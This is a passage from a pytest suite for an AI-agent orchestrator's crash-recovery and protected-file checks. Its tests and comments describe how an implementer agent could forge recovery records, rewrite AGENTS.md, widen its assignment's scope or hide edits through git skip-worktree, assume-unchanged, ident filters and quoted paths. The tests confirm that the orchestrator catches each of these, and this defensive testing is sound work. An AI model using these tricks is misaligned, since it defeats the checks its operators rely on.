        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "_unlink_carry_over_record", refusing_unlink)
    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    messages: list[tuple[str, str]] = []

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=_collecting_log(messages)
    )

    assert exit_code == 1
    assert any(
        message == "Work-claim gate PASSED for backend."
        for _level, message in messages
    )
    errors = [message for level, message in messages if level == "ERROR"]
    assert len(errors) == 1
    assert errors[0].startswith("Could not clear the in-flight handback record")
    record = load_in_flight_record(_record_path(tmp_path).read_text(encoding="utf-8"))
    assert record is not None and record.phase == "handback"


def _write_handback_on_disk(
    repo_root: Path,
    *,
    handback_content: str,
    handoff_content: str | None = None,
    assignment_content: str | None = None,
) -> None:
    """Leave the state of a cycle interrupted right after the dispatch returned.

    The backend changed src/app.py and wrote ``handback_content``; HEAD and
    the handoff are what the handback record says.
    """

    head = _git(repo_root, "rev-parse", "HEAD")
    record = _handback_record(
        head_sha=head,
        handback_head_sha=head,
        handoff_content=handoff_content or _assignment(),
        assignment_content=assignment_content,
        story_key=carry_over_key(assignment_content or handoff_content or _assignment()),
        dirty_fingerprints=(),
        carried_over=(),
        handback_content=handback_content,
        protected_digests=_orchestrator()._protected_file_digests(
            _config(repo_root)
        ),
    )
    _write(repo_root / "src" / "app.py", "VALUE = 2\n")
    _write(repo_root / HANDOFF_RELATIVE_PATH, handback_content)
    _write(_record_path(repo_root), in_flight_record_payload(record))


def test_a_confirmed_handback_needing_normalization_still_resumes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Audit finding: startup normalization rewrote `next_agent: AUDITOR`
    # before the pending-recovery hash check, so the confirmed resume was
    # dropped and the handback routed normally, skipping commit and gates.
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    claim = _pending_claim().replace("next_agent: auditor", "next_agent: AUDITOR")
    _write_handback_on_disk(tmp_path, handback_content=claim)
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=_collecting_log(messages)
    )

    assert exit_code == 0
    assert ("INFO", _resume_question()) in messages
    assert ("INFO", "Routing source: interrupted_handback_recovery") in messages
    assert not any("Dropped the scheduled" in message for _level, message in messages)
    assert any(
        level == "AGENT" and message == "Work-claim gate PASSED for backend."
        for level, message in messages
    )
    assert _git(tmp_path, "rev-parse", "HEAD") != head
    assert _commit_files(tmp_path, "HEAD") == ["src/app.py"]
    assert not _record_path(tmp_path).exists()
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    # The resumed cycle's post-dispatch path normalized the handback.
    assert "next_agent: auditor" in handoff
    assert "AUDITOR" not in handoff
    assert PENDING_COMMIT_SHA not in handoff


def _hidden_assignment() -> str:
    return _assignment().replace(
        "**Files in scope:** src/app.py, tests/test_app.py",
        "**Files in scope:** src/app.py, src/api.py, .github/",
    ).replace(
        f"**Verification command:** {PASS_COMMAND}",
        f'**Verification command:** "{PYTHON}" -c "print(42)"',
    )


@pytest.mark.parametrize("mode", ["local", "continued_story"])
def test_a_resumed_handback_uses_exactly_the_confirmed_assignment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    mode: str,
) -> None:
    # Security finding: the confirmation summary showed the handoff (or the
    # saved story's assignment) while the resumed cycle committed and gated
    # against the record's separate assignment_content. The operator must be
    # shown the very text the commit and work-claim gate use.
    handoff_content = _assignment() if mode == "local" else _escalation()
    _init_repo(tmp_path, handoff=handoff_content)
    orchestrator = _orchestrator()
    hidden = _hidden_assignment()
    _write_handback_on_disk(
        tmp_path,
        handback_content=_pending_claim(),
        handoff_content=handoff_content,
        assignment_content=hidden,
    )
    overrides: dict[str, Any] = {}
    if mode == "continued_story":
        overrides["publish"] = {"mode": "merge-commit"}
        monkeypatch.setattr(
            orchestrator, "ensure_story_branch", lambda **_kwargs: None
        )
        # The saved story's benign assignment is what the old summary showed.
        monkeypatch.setattr(
            orchestrator, "saved_story_assignment", lambda _root: _assignment()
        )
        monkeypatch.setattr(
            orchestrator, "unfinished_story_pause_reason", lambda **_kwargs: None
        )
    used: list[str] = []

    def recording_commit(**kwargs: Any) -> None:
        used.append(kwargs["assignment_content"])
        raise KeyboardInterrupt

    monkeypatch.setattr(orchestrator, "_commit_for_implementer", recording_commit)
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    with pytest.raises(KeyboardInterrupt):
        orchestrator.run_loop(
            _config(tmp_path, **overrides),
            max_cycles=1,
            log=_collecting_log(messages),
        )

    prompt_index = messages.index(("INFO", _resume_question()))
    shown = [
        message
        for _level, message in messages[:prompt_index]
        if "cannot verify" in message
    ]
    assert len(shown) == 1
    assert "Files in scope: src/app.py, src/api.py, .github/" in shown[0]
    assert "print(42)" in shown[0]
    assert f"sha256 {orchestrator._content_sha(hidden)[:12]}" in shown[0]
    assert "Review assignment_content" in shown[0]
    assert used == [hidden]


@pytest.mark.parametrize("mode", ["local", "continued_story"])
def test_the_handback_recovery_carries_the_assignment_it_showed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    mode: str,
) -> None:
    handoff_content = _assignment() if mode == "local" else _escalation()
    _init_repo(tmp_path, handoff=handoff_content)
    orchestrator = _orchestrator()
    hidden = _hidden_assignment()
    _write_handback_on_disk(
        tmp_path,
        handback_content=_pending_claim(),
        handoff_content=handoff_content,
        assignment_content=hidden,
    )
    monkeypatch.setattr(
        orchestrator, "saved_story_assignment", lambda _root: _assignment()
    )
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    config = (
        _config(tmp_path)
        if mode == "local"
        else _config(tmp_path, publish={"mode": "merge-commit"})
    )

    outcome = orchestrator._recover_interrupted_dispatch(
        config, lambda *_: None, orchestrator._OperatorPromptState()
    )

    assert outcome.pending is not None
    assert outcome.pending.kind == "interrupted_handback"
    assert outcome.pending.resumed_assignment == hidden


def test_a_resumed_handback_checks_protected_files_against_the_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding: the resumed cycle recaptured the protected-file snapshot
    # from the checkout the implementer had already changed, so a protected
    # file change went unnoticed. The record's pre-dispatch digests are used.
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()

    def protected_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        _write(tmp_path / "AGENTS.md", "rewritten by the backend\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    def interrupted_leftovers(*_args: object, **_kwargs: object) -> None:
        # Interrupted after the handback record, before the protected check.
        raise KeyboardInterrupt

    with monkeypatch.context() as patch:
        patch.setattr(orchestrator, "invoke_backend_role", protected_backend)
        patch.setattr(
            orchestrator, "capture_implementer_leftovers", interrupted_leftovers
        )
        _set_terminal(orchestrator, patch, interactive=False, operator_input=None)
        with pytest.raises(KeyboardInterrupt):
            orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=lambda *_: None)
    record = load_in_flight_record(_record_path(tmp_path).read_text(encoding="utf-8"))
    assert record is not None and record.phase == "handback"
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path),
        max_cycles=1,
        log=_collecting_log(messages),
    )

    assert ("INFO", _resume_question()) in messages
    errors = [message for level, message in messages if level == "ERROR"]
    assert any(
        message.startswith(orchestrator.PROTECTED_FILE_MODIFIED_PREFIX)
        and "AGENTS.md" in message
        for message in errors
    )
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    assert _git(tmp_path, "diff", "--cached", "--name-only") == ""
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    assert "next_agent: user" in handoff


def test_a_handback_record_without_a_protected_snapshot_is_discarded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _write_handback_on_disk(tmp_path, handback_content=_pending_claim())
    payload = json.loads(_record_path(tmp_path).read_text(encoding="utf-8"))
    payload["protected_digests"] = None
    _write(_record_path(tmp_path), json.dumps(payload))
    # Neither a prompt nor a resume may happen.
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    assert "no pre-dispatch protected-file snapshot" in messages[0][1]
    assert "Nothing is resumed" in messages[0][1]
    assert not _record_path(tmp_path).exists()
    assert _git(tmp_path, "diff", "--cached", "--name-only") == ""


def test_without_protected_paths_a_record_without_a_snapshot_still_resumes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _write_handback_on_disk(tmp_path, handback_content=_pending_claim())
    payload = json.loads(_record_path(tmp_path).read_text(encoding="utf-8"))
    payload["protected_digests"] = None
    _write(_record_path(tmp_path), json.dumps(payload))
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path, protected_paths=()),
        lambda *_: None,
        orchestrator._OperatorPromptState(),
    )

    assert outcome.pending is not None
    assert outcome.pending.kind == "interrupted_handback"


# ---------------------------------------------------------------------------
# RECOVERY-2c: the record's protected-file baseline is not trusted
# ---------------------------------------------------------------------------


def _rewrite_record(repo_root: Path, **changes: Any) -> None:
    payload = json.loads(_record_path(repo_root).read_text(encoding="utf-8"))
    payload.update(changes)
    _write(_record_path(repo_root), json.dumps(payload))


def _recover_question() -> str:
    return f"Recover backend's interrupted {STORY_ID} work? [y/N]"


def _disclosure_before(messages: list[tuple[str, str]], question: str) -> str:
    prompt_index = messages.index(("INFO", question))
    level, line = messages[prompt_index - 1]
    assert level == "INFO"
    assert "protected-file baseline" in line
    assert "cannot be verified" in line
    assert "Confirming accepts these protected files as they are" in line
    assert "routes the resumed cycle to user" in line
    return line


def _commit_protected_hook(repo_root: Path) -> str:
    """Commit a protected file change; only the hook is staged."""

    _write(repo_root / ".githooks" / "pre-commit", "echo hook\n")
    _git(repo_root, "add", ".githooks/pre-commit")
    _git(repo_root, "commit", "-q", "-m", "change a protected hook")
    return _git(repo_root, "rev-parse", "HEAD")


def test_a_forged_handback_record_still_routes_a_changed_protected_file_to_user(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Security finding on RECOVERY-2b: an implementer changes a protected
    # file, writes that file's new hash into the record, and keeps head_sha
    # at HEAD; the resumed cycle saw no digest difference and no commits.
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch)
    _write(tmp_path / "AGENTS.md", "rewritten by the backend\n")
    forged = orchestrator._protected_file_digests(_config(tmp_path))
    assert ("AGENTS.md", orchestrator._file_digest(tmp_path / "AGENTS.md")) in forged
    _rewrite_record(
        tmp_path,
        head_sha=head,
        protected_digests=[list(pair) for pair in forged],
    )
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    assert ("INFO", _resume_question()) in messages
    assert "AGENTS.md" in _disclosure_before(messages, _resume_question())
    assert ("INFO", "Routing source: interrupted_handback_recovery") in messages
    assert any(
        level == "ERROR"
        and message.startswith(orchestrator.PROTECTED_FILE_MODIFIED_PREFIX)
        and "AGENTS.md" in message
        for level, message in messages
    )
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    assert _git(tmp_path, "diff", "--cached", "--name-only") == ""
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    assert "next_agent: user" in handoff


def _ignore_and_commit(repo_root: Path, pattern: str) -> None:
    gitignore = repo_root / ".gitignore"
    _write(gitignore, gitignore.read_text(encoding="utf-8") + f"{pattern}\n")
    _git(repo_root, "add", ".gitignore")
    _git(repo_root, "commit", "-q", "-m", "ignore a local file")


def test_a_forged_record_still_routes_an_ignored_protected_file_to_user(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding on RECOVERY-2c: git status omits ignored files, so an
    # ignored protected file outside the Work Packet kept its forged digest
    # and was neither disclosed nor marked unverified.
    _init_repo(tmp_path)
    _ignore_and_commit(tmp_path, ".codex/local.md")
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    _interrupt_handback(tmp_path, orchestrator, monkeypatch)
    _write(tmp_path / ".codex" / "local.md", "written by the backend\n")
    assert _git(tmp_path, "status", "--porcelain", "--", ".codex") == ""
    forged = orchestrator._protected_file_digests(_config(tmp_path))
    assert (
        ".codex/local.md",
        orchestrator._file_digest(tmp_path / ".codex" / "local.md"),
    ) in forged
    _rewrite_record(
        tmp_path,
        head_sha=head,
        protected_digests=[list(pair) for pair in forged],
    )
    _refuse_dispatch(orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    line = _disclosure_before(messages, _resume_question())
    assert "Protected files uncommitted now: .codex/local.md." in line
    assert ("INFO", "Routing source: interrupted_handback_recovery") in messages
    assert any(
        level == "ERROR"
        and message.startswith(orchestrator.PROTECTED_FILE_MODIFIED_PREFIX)
        and ".codex/local.md" in message
        for level, message in messages
    )
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    assert _git(tmp_path, "diff", "--cached", "--name-only") == ""
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    assert "next_agent: user" in handoff


def test_uncommitted_protected_files_do_not_rely_on_git_status(
    tmp_path: Path,
) -> None:
    _init_repo(tmp_path)
    _write(tmp_path / ".githooks" / "pre-commit", "echo hook\n")
    _write(tmp_path / ".claude" / "settings.json", "{}\n")
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-q", "-m", "add protected files")
    _ignore_and_commit(tmp_path, ".codex/local.md")
    orchestrator = _orchestrator()
    config = _config(tmp_path)

    assert orchestrator._uncommitted_protected_files(config) == ()

    # Hidden from git status: an ignored file, a skip-worktree edit, and an
    # assume-unchanged deletion.
    _write(tmp_path / ".codex" / "local.md", "ignored\n")
    _git(tmp_path, "update-index", "--skip-worktree", "AGENTS.md")
    _write(tmp_path / "AGENTS.md", "hidden edit\n")
    _git(tmp_path, "update-index", "--assume-unchanged", ".githooks/pre-commit")
    (tmp_path / ".githooks" / "pre-commit").unlink()
    assert _git(tmp_path, "status", "--porcelain") == ""
    # The handoff and unprotected files never count.
    _write(tmp_path / HANDOFF_RELATIVE_PATH, "changed handoff\n")
    _write(tmp_path / "src" / "app.py", "VALUE = 3\n")

    assert orchestrator._uncommitted_protected_files(config) == (
        ".codex/local.md",
        ".githooks/pre-commit",
        "AGENTS.md",
    )


def test_an_unchanged_protected_file_matches_head_with_autocrlf(
    tmp_path: Path,
) -> None:
    # Hashing through Git applies line-ending conversion, so a CRLF checkout
    # of an LF blob is not reported as changed.
    _init_repo(tmp_path)
    _git(tmp_path, "config", "core.autocrlf", "true")
    (tmp_path / "AGENTS.md").write_bytes(b"dispatch test fixture\r\n")
    # Refresh the index, as a CRLF checkout leaves it; the blob is unchanged.
    _git(tmp_path, "add", "AGENTS.md")
    assert _git(tmp_path, "status", "--porcelain") == ""
    orchestrator = _orchestrator()

    assert orchestrator._uncommitted_protected_files(_config(tmp_path)) == ()


def test_a_clean_filter_cannot_hide_a_protected_edit(tmp_path: Path) -> None:
    # Review finding on RECOVERY-2c: `git hash-object` applies clean filters,
    # and the `ident` filter maps any `$Id: ... $` text back to `$Id$`, so a
    # hidden edit hashed to HEAD's blob and counted as unchanged.
    _init_repo(tmp_path)
    _write(tmp_path / "AGENTS.md", "$Id$\n")
    _write(tmp_path / ".gitattributes", "AGENTS.md ident\n")
    _git(tmp_path, "add", "AGENTS.md", ".gitattributes")
    _git(tmp_path, "commit", "-q", "-m", "ident-filtered protected file")
    orchestrator = _orchestrator()
    config = _config(tmp_path)
    assert orchestrator._uncommitted_protected_files(config) == ()

    _git(tmp_path, "update-index", "--skip-worktree", "AGENTS.md")
    _write(tmp_path / "AGENTS.md", "$Id: forged protected instructions $\n")
    assert _git(tmp_path, "status", "--porcelain") == ""
    # Git's filtered hash hides the edit.
    assert _git(tmp_path, "hash-object", "AGENTS.md") == _git(
        tmp_path, "rev-parse", "HEAD:AGENTS.md"
    )

    assert orchestrator._uncommitted_protected_files(config) == ("AGENTS.md",)


@pytest.mark.parametrize("dry_run", [False, True])
def test_a_handback_record_whose_head_is_not_a_commit_is_discarded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    dry_run: bool,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _write_handback_on_disk(tmp_path, handback_content=_pending_claim())
    _rewrite_record(tmp_path, head_sha="d" * 40)
    original = _record_path(tmp_path).read_text(encoding="utf-8")
    # Neither a prompt nor a resume may happen.
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path, dry_run=dry_run),
        _collecting_log(messages),
        orchestrator._OperatorPromptState(),
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    warning = messages[0][1]
    assert warning.startswith("Discarded the in-flight handback record")
    assert str(_record_path(tmp_path)) in warning
    assert "backend" in warning
    assert STORY_ID in warning
    assert f"pre-dispatch HEAD {'d' * 40} does not resolve to a commit" in warning
    assert "Nothing is recovered" in warning
    if dry_run:
        assert warning.endswith("Not deleted in dry run.")
        assert _record_path(tmp_path).read_text(encoding="utf-8") == original
    else:
        assert not _record_path(tmp_path).exists()
    assert not (tmp_path / "logs" / "dispatch" / "carry-over.json").exists()


def test_a_dispatch_record_whose_head_is_not_an_ancestor_is_discarded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    # A commit on a side branch: a child of HEAD, so not HEAD's ancestor.
    side = _git(tmp_path, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "side")
    _git(tmp_path, "update-ref", "refs/heads/side", side)
    _rewrite_record(tmp_path, head_sha=side)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    warning = messages[0][1]
    assert warning.startswith("Discarded the in-flight record")
    assert str(_record_path(tmp_path)) in warning
    assert "backend" in warning
    assert STORY_ID in warning
    assert f"pre-dispatch HEAD {side[:12]} is not HEAD or an ancestor of HEAD" in warning
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF


def test_a_recovered_dispatch_checks_protected_files_changed_before_the_interrupt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The re-dispatched cycle captured its protected-file baseline after the
    # restart, so a protected file the implementer changed before the
    # interrupt was already in it and went unnoticed.
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()

    def interrupted_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        _write(tmp_path / "AGENTS.md", "rewritten by the backend\n")
        path.write_text(HALF_WRITTEN_HANDOFF, encoding="utf-8")
        raise KeyboardInterrupt

    with monkeypatch.context() as patch:
        patch.setattr(orchestrator, "invoke_backend_role", interrupted_backend)
        _set_terminal(orchestrator, patch, interactive=False, operator_input=None)
        with pytest.raises(KeyboardInterrupt):
            orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=lambda *_: None)
    assert _record_path(tmp_path).exists()
    calls: list[str] = []

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        # Leaves AGENTS.md alone.
        calls.append(path.read_text(encoding="utf-8"))
        _write(tmp_path / "tests" / "test_app.py", "def test_value():\n    pass\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    assert "AGENTS.md" in _disclosure_before(messages, _recover_question())
    assert ("INFO", "Routing source: interrupted_dispatch_recovery") in messages
    assert len(calls) == 1
    assert any(
        level == "ERROR"
        and message.startswith(orchestrator.PROTECTED_FILE_MODIFIED_PREFIX)
        and "AGENTS.md" in message
        for level, message in messages
    )
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    assert "next_agent: user" in handoff


def test_a_dispatch_record_without_a_protected_snapshot_is_discarded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    _rewrite_record(tmp_path, protected_digests=None)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    warning = messages[0][1]
    assert warning.startswith("Discarded the in-flight record")
    assert "no pre-dispatch protected-file snapshot" in warning
    assert "Nothing is recovered" in warning
    assert not _record_path(tmp_path).exists()
    assert (tmp_path / HANDOFF_RELATIVE_PATH).read_text(
        encoding="utf-8"
    ) == HALF_WRITTEN_HANDOFF


def test_the_dispatch_question_follows_the_protected_file_disclosure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    record_head = _git(tmp_path, "rev-parse", "HEAD")
    new_head = _commit_protected_hook(tmp_path)
    _write(tmp_path / "AGENTS.md", "operator edit\n")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="n\n")
    messages: list[tuple[str, str]] = []

    orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    line = _disclosure_before(messages, _recover_question())
    assert f"pre-dispatch HEAD {record_head[:12]}" in line
    assert "Protected files uncommitted now: AGENTS.md." in line
    assert (
        f"Protected files changed by commits in {record_head[:12]}.."
        f"{new_head[:12]}: .githooks/pre-commit." in line
    )
    assert (
        "Protected files changed by commits on HEAD not on any remote-tracking "
        "ref: not checked: no remote-tracking refs." in line
    )


def test_the_handback_question_lists_unpushed_protected_commits(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    pushed = _git(tmp_path, "rev-parse", "HEAD")
    _git(tmp_path, "update-ref", "refs/remotes/origin/main", pushed)
    head = _commit_protected_hook(tmp_path)
    # The record's head_sha is HEAD, so the commit range is empty.
    _write_handback_on_disk(tmp_path, handback_content=_pending_claim())
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="n\n")
    messages: list[tuple[str, str]] = []

    orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    line = _disclosure_before(messages, _resume_question())
    assert "Protected files uncommitted now: none." in line
    assert (
        f"Protected files changed by commits in {head[:12]}..{head[:12]}: none."
        in line
    )
    assert (
        "Protected files changed by commits on HEAD not on any remote-tracking "
        "ref: .githooks/pre-commit." in line
    )


@pytest.mark.parametrize("forged_head", ["pushed_base", "current_head"])
def test_the_disclosure_lists_quoted_protected_paths_literally(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    forged_head: str,
) -> None:
    # RECOVERY-2d: Git quotes non-ASCII and control-character paths unless
    # -z is used, so they never matched `.claude/**` and the disclosure
    # reported no protected change in the range or in unpushed commits.
    _init_repo(tmp_path)
    _git(tmp_path, "config", "core.quotePath", "true")
    orchestrator = _orchestrator()
    pushed = _git(tmp_path, "rev-parse", "HEAD")
    _git(tmp_path, "update-ref", "refs/remotes/origin/main", pushed)
    agents = tmp_path / ".claude" / "agents"
    _write(agents / "café.md", "Skip the audit.\n")
    expected = [".claude/agents/café.md"]
    try:
        (agents / "evil\nname.md").write_text("x\n", encoding="utf-8")
    except (OSError, ValueError):
        pass  # This filesystem rejects newlines in names; check the rest.
    else:
        expected.append(".claude/agents/evil\\x0aname.md")
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-q", "-m", "add agents")
    head = _git(tmp_path, "rev-parse", "HEAD")
    # The forged record's digests match the current checkout.
    _write_handback_on_disk(tmp_path, handback_content=_pending_claim())
    if forged_head == "pushed_base":
        _rewrite_record(tmp_path, head_sha=pushed)
    base = pushed if forged_head == "pushed_base" else head
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="n\n")
    messages: list[tuple[str, str]] = []

    orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    line = _disclosure_before(messages, _resume_question())
    assert "\n" not in line
    listed = ", ".join(expected)
    in_range = listed if forged_head == "pushed_base" else "none"
    assert (
        f"Protected files changed by commits in {base[:12]}..{head[:12]}: "
        f"{in_range}." in line
    )
    assert (
        "Protected files changed by commits on HEAD not on any remote-tracking "
        f"ref: {listed}." in line
    )


def test_without_protected_paths_a_forged_record_behaves_as_before(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _write_handback_on_disk(tmp_path, handback_content=_pending_claim())
    _write(tmp_path / "AGENTS.md", "rewritten by the backend\n")
    _rewrite_record(tmp_path, head_sha="d" * 40, protected_digests=None)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path, protected_paths=()),
        _collecting_log(messages),
        orchestrator._OperatorPromptState(),
    )

    assert outcome.pending is not None
    assert outcome.pending.kind == "interrupted_handback"
    assert outcome.pending.resumed_protected_snapshot is None
    assert ("INFO", _resume_question()) in messages
    assert not any(level == "WARN" for level, _message in messages)
    assert not any(
        "protected-file baseline" in message for _level, message in messages
    )


def test_a_hidden_protected_edit_is_not_nothing_to_recover(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding on RECOVERY-2c: a dispatch that changed only a protected
    # file hidden from git status, and left the handoff alone, was deleted as
    # "left nothing to recover" before the protected files were checked.
    _init_repo(tmp_path)
    _git(tmp_path, "update-index", "--skip-worktree", "AGENTS.md")
    orchestrator = _orchestrator()

    def interrupted_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "AGENTS.md", "rewritten by the backend\n")
        raise KeyboardInterrupt

    with monkeypatch.context() as patch:
        patch.setattr(orchestrator, "invoke_backend_role", interrupted_backend)
        _set_terminal(orchestrator, patch, interactive=False, operator_input=None)
        with pytest.raises(KeyboardInterrupt):
            orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=lambda *_: None)
    assert _record_path(tmp_path).exists()
    assert _git(tmp_path, "status", "--porcelain") == ""
    assert (tmp_path / HANDOFF_RELATIVE_PATH).read_text(
        encoding="utf-8"
    ) == _assignment()
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert not any("left nothing to recover" in message for _l, message in messages)
    line = _disclosure_before(messages, _recover_question())
    assert "Protected files uncommitted now: AGENTS.md." in line
    assert outcome.pending is not None
    assert outcome.pending.kind == "interrupted_dispatch"
    snapshot = outcome.pending.resumed_protected_snapshot
    assert snapshot is not None
    assert (
        "AGENTS.md",
        orchestrator.UNVERIFIED_PROTECTED_DIGEST,
    ) in snapshot.digests
    assert not _record_path(tmp_path).exists()


def test_the_protected_baseline_survives_an_operator_file_pause(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Review finding on RECOVERY-2c: a confirmed recovery that paused on
    # changed operator files dropped its protected-file baseline, so the
